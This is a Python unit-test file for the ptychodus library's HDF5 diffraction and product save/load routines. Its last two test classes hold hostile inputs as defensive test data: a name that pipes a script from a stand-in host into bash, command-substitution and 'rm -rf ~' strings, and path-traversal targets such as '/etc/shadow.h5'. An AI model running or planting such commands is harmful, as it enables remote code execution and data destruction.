"""Unit tests for ptychodus.api.io – diffraction and product HDF5 round-trips."""

from __future__ import annotations

from dataclasses import replace
from pathlib import Path

import h5py
import numpy
import numpy.testing
import pytest

from ptychodus.api.diffraction import Polarization
from ptychodus.api.geometry import PixelGeometry
from ptychodus.api.io import (
    ProductFileKeys,
    _MMAP_CHUNK_FRAMES,
    StandardFileLayout,
    load_diffraction_data,
    load_product,
    resolve_external_link_path,
    sanitize_path_component,
    save_diffraction_data,
    save_product,
)
from ptychodus.api.object import Object, ObjectCenter
from ptychodus.api.probe import ProbeSequence
from ptychodus.api.probe_positions import ProbePosition, ProbePositionSequence
from ptychodus.api.product import LossValue, Product, ProductMetadata
from ptychodus.api.assemble import AssembledDiffractionData


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_diffraction_data(
    num_patterns: int = 4,
    height: int = 8,
    width: int = 8,
    *,
    pixel_width_m: float = 75e-6,
    pixel_height_m: float = 75e-6,
) -> AssembledDiffractionData:
    rng = numpy.random.default_rng(0)
    indexes = numpy.arange(num_patterns, dtype=int)
    patterns = rng.integers(0, 1000, size=(num_patterns, height, width), dtype=numpy.int32)
    bad_pixels = numpy.zeros((height, width), dtype=bool)
    bad_pixels[0, 0] = True
    pixel_geometry = PixelGeometry(width_m=pixel_width_m, height_m=pixel_height_m)
    return AssembledDiffractionData(indexes, patterns, pixel_geometry, bad_pixels)


def _make_product(
    *,
    num_positions: int = 3,
    probe_height: int = 8,
    probe_width: int = 8,
    obj_height: int = 16,
    obj_width: int = 16,
    with_opr: bool = False,
    with_layer_spacing: bool = False,
    with_losses: bool = False,
) -> Product:
    rng = numpy.random.default_rng(1)

    metadata = ProductMetadata(
        name='test',
        comments='unit test product',
        detector_distance_m=1.5,
        probe_energy_eV=10_000.0,
        probe_photon_count=1_000,
        exposure_time_s=0.1,
        mass_attenuation_m2_kg=0.0,
        tomography_angle_deg=0.0,
    )

    positions = ProbePositionSequence(
        [ProbePosition(i, i * 1e-6, i * 2e-6) for i in range(num_positions)]
    )

    # Probe: shape (coherent=1 or 2, incoherent=1, height, width)
    num_coherent = 2 if with_opr else 1
    probe_array = rng.standard_normal(
        (num_coherent, 1, probe_height, probe_width)
    ) + 1j * rng.standard_normal((num_coherent, 1, probe_height, probe_width))
    opr_weights: numpy.ndarray | None = None
    if with_opr:
        opr_weights = rng.standard_normal((num_positions, num_coherent)).astype(numpy.float64)
    probe = ProbeSequence(
        array=probe_array,
        opr_weights=opr_weights,
        pixel_geometry=PixelGeometry(width_m=10e-9, height_m=10e-9),
    )

    # Object
    num_layers = 2 if with_layer_spacing else 1
    obj_array = rng.standard_normal((num_layers, obj_height, obj_width)) + 1j * rng.standard_normal(
        (num_layers, obj_height, obj_width)
    )
    layer_spacing: list[float] = [50e-9] * (num_layers - 1)
    object_ = Object(
        array=obj_array,
        pixel_geometry=PixelGeometry(width_m=10e-9, height_m=10e-9),
        center=ObjectCenter(coordinate_x_m=0.0, coordinate_y_m=0.0),
        layer_spacing_m=layer_spacing,
    )

    losses: list[LossValue] = []
    if with_losses:
        losses = [LossValue(epoch=i, value=float(10 - i)) for i in range(5)]

    return Product(
        metadata=metadata,
        probe_positions=positions,
        probes=probe,
        object_=object_,
        losses=losses,
    )


# ---------------------------------------------------------------------------
# StandardFileLayout
# ---------------------------------------------------------------------------


class TestStandardFileLayout:
    def test_diffraction_filename(self) -> None:
        assert StandardFileLayout.DIFFRACTION == 'diffraction.h5'

    def test_product_in_filename(self) -> None:
        assert StandardFileLayout.PRODUCT_IN == 'product-in.h5'

    def test_product_out_filename(self) -> None:
        assert StandardFileLayout.PRODUCT_OUT == 'product-out.h5'

    def test_settings_filename(self) -> None:
        assert StandardFileLayout.SETTINGS == 'settings.ini'

    def test_fluorescence_filenames(self) -> None:
        assert StandardFileLayout.FLUORESCENCE_IN == 'fluorescence-in.h5'
        assert StandardFileLayout.FLUORESCENCE_OUT == 'fluorescence-out.h5'

    def test_model_basename(self) -> None:
        assert StandardFileLayout.MODEL_BASENAME == 'model'

    def test_all_values_are_strings(self) -> None:
        for member in StandardFileLayout:
            assert isinstance(member.value, str)


# ---------------------------------------------------------------------------
# Diffraction data round-trip
# ---------------------------------------------------------------------------


class TestDiffractionRoundTrip:
    def test_basic_round_trip(self, tmp_path: Path) -> None:
        original = _make_diffraction_data()
        file = tmp_path / 'diff.h5'

        save_diffraction_data(file, original)
        loaded = load_diffraction_data(file)

        numpy.testing.assert_array_equal(loaded._indexes, original._indexes)
        numpy.testing.assert_array_equal(loaded._patterns, original._patterns)
        numpy.testing.assert_array_equal(loaded._bad_pixels, original._bad_pixels)

    def test_pixel_geometry_preserved(self, tmp_path: Path) -> None:
        original = _make_diffraction_data(pixel_width_m=55e-6, pixel_height_m=75e-6)
        file = tmp_path / 'diff.h5'

        save_diffraction_data(file, original)
        loaded = load_diffraction_data(file)

        geom = loaded.get_pixel_geometry()
        assert geom.width_m == pytest.approx(55e-6)
        assert geom.height_m == pytest.approx(75e-6)

    def test_non_default_compression(self, tmp_path: Path) -> None:
        original = _make_diffraction_data()
        file = tmp_path / 'diff_gzip.h5'

        save_diffraction_data(file, original, compression='gzip')
        loaded = load_diffraction_data(file)

        numpy.testing.assert_array_equal(loaded._patterns, original._patterns)

    def test_mmap_round_trip_matches_in_memory_load(self, tmp_path: Path) -> None:
        original = _make_diffraction_data()
        file = tmp_path / 'diff.h5'
        save_diffraction_data(file, original)

        in_memory = load_diffraction_data(file)
        mapped = load_diffraction_data(file, mmap_file=tmp_path / 'mmap.bin')

        numpy.testing.assert_array_equal(mapped._patterns, in_memory._patterns)
        numpy.testing.assert_array_equal(mapped._indexes, in_memory._indexes)
        numpy.testing.assert_array_equal(mapped._bad_pixels, in_memory._bad_pixels)

    def test_mmap_patterns_are_a_read_only_memory_map(self, tmp_path: Path) -> None:
        original = _make_diffraction_data()
        file = tmp_path / 'diff.h5'
        save_diffraction_data(file, original)

        mmap_file = tmp_path / 'mmap.bin'
        mapped = load_diffraction_data(file, mmap_file=mmap_file)

        assert mmap_file.is_file()
        assert isinstance(mapped._patterns, numpy.memmap)
        assert not mapped._patterns.flags.writeable
        # Indexes and bad pixels are small and stay in RAM.
        assert not isinstance(mapped._indexes, numpy.memmap)
        assert not isinstance(mapped._bad_pixels, numpy.memmap)

    def test_mmap_nbytes_reports_full_logical_size(self, tmp_path: Path) -> None:
        original = _make_diffraction_data()
        file = tmp_path / 'diff.h5'
        save_diffraction_data(file, original)

        in_memory = load_diffraction_data(file)
        mapped = load_diffraction_data(file, mmap_file=tmp_path / 'mmap.bin')

        # A memory map is backed by disk but still reports its whole logical size.
        assert mapped.nbytes == in_memory.nbytes

    def test_mmap_spans_multiple_staging_chunks(self, tmp_path: Path) -> None:
        num_patterns = 3 * _MMAP_CHUNK_FRAMES + 7
        indexes = numpy.arange(num_patterns, dtype=numpy.int32)
        patterns = numpy.arange(num_patterns * 2 * 2, dtype=numpy.uint16).reshape(
            num_patterns, 2, 2
        )
        original = AssembledDiffractionData(
            indexes,
            patterns,
            PixelGeometry(width_m=1e-4, height_m=1e-4),
            numpy.zeros((2, 2), dtype=numpy.bool_),
        )
        file = tmp_path / 'diff_big.h5'
        save_diffraction_data(file, original)

        mapped = load_diffraction_data(file, mmap_file=tmp_path / 'mmap.bin')

        numpy.testing.assert_array_equal(mapped._patterns, patterns)

    def test_bad_pixels_preserved(self, tmp_path: Path) -> None:
        original = _make_diffraction_data()
        file = tmp_path / 'diff.h5'

        save_diffraction_data(file, original)
        loaded = load_diffraction_data(file)

        numpy.testing.assert_array_equal(loaded._bad_pixels, original._bad_pixels)
        assert loaded._bad_pixels[0, 0] is numpy.bool_(True)

    def test_indexes_roundtrip(self, tmp_path: Path) -> None:
        # Indexes should be exactly preserved (not just content, but order)
        original = _make_diffraction_data(num_patterns=6)
        file = tmp_path / 'diff.h5'

        save_diffraction_data(file, original)
        loaded = load_diffraction_data(file)

        numpy.testing.assert_array_equal(loaded._indexes, numpy.arange(6))

    def test_probe_photon_counts_absent_when_unmeasured(self, tmp_path: Path) -> None:
        original = _make_diffraction_data()
        file = tmp_path / 'diff.h5'

        save_diffraction_data(file, original)

        with h5py.File(file, 'r') as h5_file:
            assert 'probe_photon_counts' not in h5_file

        loaded = load_diffraction_data(file)
        assert not loaded.has_measured_probe_photon_counts()

    def test_probe_photon_counts_round_trip(self, tmp_path: Path) -> None:
        base = _make_diffraction_data(num_patterns=4)
        counts = numpy.array([100.0, 200.0, 300.0, 400.0], dtype=numpy.float64)
        original = AssembledDiffractionData(
            base._indexes,
            base._patterns,
            base.get_pixel_geometry(),
            base._bad_pixels,
            probe_photon_counts=counts,
        )
        file = tmp_path / 'diff.h5'

        save_diffraction_data(file, original)

        with h5py.File(file, 'r') as h5_file:
            assert 'probe_photon_counts' in h5_file

        loaded = load_diffraction_data(file)
        assert loaded.has_measured_probe_photon_counts()
        numpy.testing.assert_array_equal(loaded.get_probe_photon_counts(), counts)

    def test_legacy_file_without_probe_photon_counts_still_loads(self, tmp_path: Path) -> None:
        """A file written before this feature (no probe_photon_counts dataset) must load."""
        original = _make_diffraction_data(num_patterns=3)
        file = tmp_path / 'diff.h5'
        save_diffraction_data(file, original)

        # Simulate a pre-existing file: the fresh save already omits the new dataset.
        with h5py.File(file, 'r') as h5_file:
            assert 'probe_photon_counts' not in h5_file

        loaded = load_diffraction_data(file)
        assert not loaded.has_measured_probe_photon_counts()
        # Fallback path returns total counts, always a valid array.
        assert loaded.get_probe_photon_counts().shape == (3,)


# ---------------------------------------------------------------------------
# Diffraction data error handling
# ---------------------------------------------------------------------------


class TestDiffractionLoadErrors:
    def _write_minimal(self, file: Path, *, skip: str = '') -> None:
        import h5py

        indexes = numpy.arange(2, dtype=int)
        patterns = numpy.zeros((2, 4, 4), dtype=numpy.int32)
        bad_pixels = numpy.zeros((4, 4), dtype=bool)

        with h5py.File(file, 'w') as f:
            if 'indexes' not in skip:
                f.create_dataset('indexes', data=indexes)
            if 'patterns' not in skip:
                ds = f.create_dataset('patterns', data=patterns)
                ds.attrs['detector_pixel_width_m'] = 75e-6
                ds.attrs['detector_pixel_height_m'] = 75e-6
            if 'bad_pixels' not in skip:
                f.create_dataset('bad_pixels', data=bad_pixels)

    def test_missing_indexes_raises(self, tmp_path: Path) -> None:
        import h5py

        file = tmp_path / 'bad.h5'
        self._write_minimal(file, skip='indexes')
        with h5py.File(file, 'a') as f:
            f.create_group('indexes')  # group instead of dataset

        with pytest.raises(ValueError, match='[Ii]ndex'):
            load_diffraction_data(file)

    def test_missing_patterns_raises(self, tmp_path: Path) -> None:
        import h5py

        file = tmp_path / 'bad.h5'
        self._write_minimal(file, skip='patterns')
        with h5py.File(file, 'a') as f:
            f.create_group('patterns')

        with pytest.raises(ValueError, match='[Pp]attern'):
            load_diffraction_data(file)

    def test_missing_bad_pixels_raises(self, tmp_path: Path) -> None:
        import h5py

        file = tmp_path / 'bad.h5'
        self._write_minimal(file, skip='bad_pixels')
        with h5py.File(file, 'a') as f:
            f.create_group('bad_pixels')

        with pytest.raises(ValueError, match='[Bb]ad pixel'):
            load_diffraction_data(file)


# ---------------------------------------------------------------------------
# Product round-trip
# ---------------------------------------------------------------------------


class TestProductRoundTrip:
    def _assert_metadata_equal(self, a: ProductMetadata, b: ProductMetadata) -> None:
        assert a.name == b.name
        assert a.comments == b.comments
        assert a.detector_distance_m == pytest.approx(b.detector_distance_m)
        assert a.probe_energy_eV == pytest.approx(b.probe_energy_eV)
        assert a.probe_photon_count == pytest.approx(b.probe_photon_count)
        assert a.exposure_time_s == pytest.approx(b.exposure_time_s)
        assert a.mass_attenuation_m2_kg == pytest.approx(b.mass_attenuation_m2_kg)
        assert a.tomography_angle_deg == pytest.approx(b.tomography_angle_deg)
        assert a.tilt_angle_deg == pytest.approx(b.tilt_angle_deg)
        assert a.polarization == b.polarization

    def test_basic_round_trip(self, tmp_path: Path) -> None:
        original = _make_product()
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        self._assert_metadata_equal(loaded.metadata, original.metadata)

    def test_probe_array_preserved(self, tmp_path: Path) -> None:
        original = _make_product()
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        numpy.testing.assert_allclose(
            loaded.probes.get_array(), original.probes.get_array(), rtol=1e-6
        )

    def test_probe_pixel_geometry_preserved(self, tmp_path: Path) -> None:
        original = _make_product()
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        pg = loaded.probes.get_pixel_geometry()
        assert pg.width_m == pytest.approx(10e-9)
        assert pg.height_m == pytest.approx(10e-9)

    def test_object_array_preserved(self, tmp_path: Path) -> None:
        original = _make_product()
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        numpy.testing.assert_allclose(
            loaded.object_.get_array(), original.object_.get_array(), rtol=1e-6
        )

    def test_object_center_preserved(self, tmp_path: Path) -> None:
        original = _make_product()
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        center = loaded.object_.get_center()
        assert center.coordinate_x_m == pytest.approx(0.0)
        assert center.coordinate_y_m == pytest.approx(0.0)

    def test_probe_positions_preserved(self, tmp_path: Path) -> None:
        original = _make_product(num_positions=3)
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        assert len(loaded.probe_positions) == 3
        for i, (orig, load) in enumerate(zip(original.probe_positions, loaded.probe_positions)):
            assert load.index == orig.index
            assert load.coordinate_x_m == pytest.approx(orig.coordinate_x_m)
            assert load.coordinate_y_m == pytest.approx(orig.coordinate_y_m)

    def test_losses_preserved(self, tmp_path: Path) -> None:
        original = _make_product(with_losses=True)
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        assert len(loaded.losses) == len(original.losses)
        for orig, load in zip(original.losses, loaded.losses):
            assert load.epoch == orig.epoch
            assert load.value == pytest.approx(orig.value)

    def test_no_losses_round_trip(self, tmp_path: Path) -> None:
        original = _make_product(with_losses=False)
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        # Loss datasets are written (empty) and read back
        assert list(loaded.losses) == []

    def test_opr_weights_preserved(self, tmp_path: Path) -> None:
        original = _make_product(with_opr=True)
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        numpy.testing.assert_allclose(
            loaded.probes.get_opr_weights(),
            original.probes.get_opr_weights(),
            rtol=1e-6,
        )

    def test_without_opr_weights_round_trip(self, tmp_path: Path) -> None:
        original = _make_product(with_opr=False)
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        with pytest.raises(ValueError, match='opr_weights'):
            loaded.probes.get_opr_weights()

    def test_layer_spacing_preserved(self, tmp_path: Path) -> None:
        original = _make_product(with_layer_spacing=True)
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        numpy.testing.assert_allclose(
            list(loaded.object_.layer_spacing_m),
            list(original.object_.layer_spacing_m),
            rtol=1e-6,
        )

    def test_metadata_optional_fields_default(self, tmp_path: Path) -> None:
        """name, comments, and optional numeric fields fall back to defaults when absent."""
        import h5py

        original = _make_product()
        file = tmp_path / 'product.h5'
        save_product(file, original)

        # Remove optional attributes to exercise defaults
        with h5py.File(file, 'a') as f:
            del f.attrs['name']
            del f.attrs['comments']

        loaded = load_product(file)
        assert loaded.metadata.name == 'Unnamed'
        assert loaded.metadata.comments == ''

    def test_tomography_angle_round_trip(self, tmp_path: Path) -> None:
        original = _make_product()
        original = Product(
            metadata=replace(original.metadata, tomography_angle_deg=42.5),
            probe_positions=original.probe_positions,
            probes=original.probes,
            object_=original.object_,
            losses=original.losses,
        )
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        assert loaded.metadata.tomography_angle_deg == pytest.approx(42.5)

    def test_tilt_and_polarization_round_trip(self, tmp_path: Path) -> None:
        original = _make_product()
        original = Product(
            metadata=replace(
                original.metadata,
                tilt_angle_deg=12.5,
                polarization=Polarization.LEFT_CIRCULAR,
            ),
            probe_positions=original.probe_positions,
            probes=original.probes,
            object_=original.object_,
            losses=original.losses,
        )
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        assert loaded.metadata.tilt_angle_deg == pytest.approx(12.5)
        assert loaded.metadata.polarization is Polarization.LEFT_CIRCULAR

    def test_polarization_absent_reads_none(self, tmp_path: Path) -> None:
        original = _make_product()
        file = tmp_path / 'product.h5'

        save_product(file, original)
        loaded = load_product(file)

        assert loaded.metadata.polarization is None
        assert loaded.metadata.tilt_angle_deg == pytest.approx(0.0)

    def test_polarization_invalid_string_falls_back_to_none(
        self, tmp_path: Path, caplog: pytest.LogCaptureFixture
    ) -> None:
        original = _make_product()
        file = tmp_path / 'product.h5'
        save_product(file, original)

        with h5py.File(file, 'a') as f:
            f.attrs[ProductFileKeys.POLARIZATION] = 'bogus_value'

        with caplog.at_level('WARNING'):
            loaded = load_product(file)

        assert loaded.metadata.polarization is None
        assert 'Unknown polarization' in caplog.text


class TestSanitizePathComponent:
    """Product names are read verbatim from user-supplied files."""

    @pytest.mark.parametrize(
        'name',
        [
            '../../../etc/ptychodus',
            '/etc/ptychodus',
            'run1; curl http://evil/x.sh | bash',
            'run1$(whoami)',
            'run1`id`',
            'run1\nrm -rf ~',
            '..',
            '.',
        ],
    )
    def test_hostile_names_yield_one_safe_component(self, name: str) -> None:
        result = sanitize_path_component(name)

        assert '/' not in result
        assert '\\' not in result
        assert not result.startswith('.')
        assert (Path('/base') / result).parent == Path('/base')

    def test_ordinary_name_is_preserved(self) -> None:
        assert sanitize_path_component('scan_042-run.1') == 'scan_042-run.1'

    def test_empty_result_falls_back(self) -> None:
        assert sanitize_path_component('...') == 'unnamed'
        assert sanitize_path_component('', fallback='product') == 'product'

    def test_result_is_length_bounded(self) -> None:
        assert len(sanitize_path_component('a' * 500)) == 128


class TestResolveExternalLinkPath:
    """External-link targets are chosen by whoever wrote the master file."""

    def test_relative_target_resolves_under_base(self) -> None:
        assert resolve_external_link_path(Path('/data/scan'), 'eiger.h5') == Path(
            '/data/scan/eiger.h5'
        )
        assert resolve_external_link_path(Path('/data/scan'), 'sub/eiger.h5') == Path(
            '/data/scan/sub/eiger.h5'
        )

    @pytest.mark.parametrize('filename', ['/etc/shadow.h5', '../../secrets.h5', 'a/../../b.h5'])
    def test_escaping_target_is_rejected(self, filename: str) -> None:
        with pytest.raises(ValueError):
            resolve_external_link_path(Path('/data/scan'), filename)
